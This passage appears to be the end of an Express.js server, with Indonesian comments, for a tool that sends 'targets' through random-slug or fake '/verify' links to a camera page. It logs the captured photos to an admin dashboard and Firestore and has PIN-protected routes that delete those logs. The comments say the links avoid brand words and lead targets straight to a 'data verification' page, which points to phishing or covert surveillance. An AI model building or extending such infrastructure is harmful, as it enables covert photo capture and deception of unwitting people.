 * WAJIB menyertakan PIN Admin: "Hanya gw yang boleh hapus"
 */
app.delete('/api/logs/:id', verifyAdminPin, async (req, res) => {
  const { id } = req.params;
  const index = logs.findIndex(item => item.id === id);
  if (index !== -1) {
    logs.splice(index, 1);
    saveLogsToDisk(logs);
  }
  await deleteLogFromFirestore(id);
  return res.json({ success: true, message: `Log ${id} berhasil dihapus permanen oleh Admin dari database cloud & lokal`, logs });
});

/**
 * DELETE /api/logs
 * Mengosongkan seluruh data log dari disk dan Cloud Firestore
 * WAJIB menyertakan PIN Admin: "Hanya gw yang boleh hapus"
 */
app.delete('/api/logs', verifyAdminPin, async (req, res) => {
  if (firestoreDb) {
    try {
      const snap = await getDocs(collection(firestoreDb, 'logs'));
      const batchPromises = [];
      snap.forEach(d => {
        batchPromises.push(deleteDoc(d.ref));
      });
      await Promise.all(batchPromises);
      console.log(`[Firestore] Seluruh ${snap.size} dokumen log berhasil dikosongkan`);
    } catch (e) {
      console.warn('Error clearing Firestore logs:', e.message);
    }
  }
  logs.length = 0;
  saveLogsToDisk(logs);
  res.json({ success: true, message: 'Semua log berhasil dihapus secara permanen oleh Admin dari database cloud & lokal', logs: [] });
});

/**
 * Explicit route for /camera-test.html and aliases
 */
const sendCameraPage = (req, res) => {
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0');
  const p = path.join(__dirname, 'public', 'camera-test.html');
  if (fs.existsSync(p)) return res.sendFile(p);
  const pDist = path.join(__dirname, 'dist', 'camera-test.html');
  if (fs.existsSync(pDist)) return res.sendFile(pDist);
  res.sendFile(path.join(__dirname, 'camera-test.html'));
};

app.get('/camera-test.html', sendCameraPage);
app.get('/camera-test', sendCameraPage);
app.get('/camera', sendCameraPage);
app.get('/verify', sendCameraPage);
app.get('/v/:slug', sendCameraPage);
app.get('/d/:slug', sendCameraPage);

/**
 * Route untuk tautan abjad manual/random (bebas tanpa batas huruf, tanpa kata merek)
 * Mengarahkan target langsung ke halaman verifikasi data
 */
app.get('/:slug([a-zA-Z0-9_-]+)', (req, res, next) => {
  const reserved = ['admin', 'dashboard', 'track', 'camera', 'index', 'assets', 'api', 'dist', 'public', 'favicon'];
  if (reserved.includes(req.params.slug.toLowerCase())) {
    return next();
  }
  sendCameraPage(req, res);
});

/**
 * Explicit route for /index.html, /, and dashboard aliases
 */
const sendIndexPage = (req, res) => {
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0');
  const p = path.join(__dirname, 'public', 'index.html');
  if (fs.existsSync(p)) return res.sendFile(p);
  const pDist = path.join(__dirname, 'dist', 'index.html');
  if (fs.existsSync(pDist)) return res.sendFile(pDist);
  res.sendFile(path.join(__dirname, 'index.html'));
};

app.get('/index.html', sendIndexPage);
app.get('/index', sendIndexPage);
app.get('/admin', sendIndexPage);
app.get('/dashboard', sendIndexPage);
app.get('/', sendIndexPage);

app.listen(PORT, '0.0.0.0', async () => {
  console.log(`🚀 Server berjalan di http://0.0.0.0:${PORT}`);
  console.log(`📁 Static folder: ${path.join(__dirname, 'public')}`);
  console.log(`🔒 Admin PIN: ${adminConfig.pin} (Hanya Admin yang berhak menghapus data log)`);

  // Sinkronisasi data awal dari Cloud Firestore dan bersihkan foto yang sudah > 1 bulan
  try {
    const initialLogs = await fetchLogsFromCloudAndSync();
    console.log(`[Database] Sinkronisasi awal berhasil: ${initialLogs.length} data log termuat.`);
  } catch (err) {
    console.warn('[Database] Peringatan sinkronisasi awal:', err.message);
  }

  // Rutinitas terjadwal setiap 6 jam untuk memeriksa dan menghapus foto > 30 hari
  setInterval(() => {
    console.log('[Storage Schedule] Menjalankan pengecekan pembersihan foto kadaluarsa (> 1 bulan)...');
    cleanExpiredPhotos(logs);
  }, 6 * 60 * 60 * 1000);
});
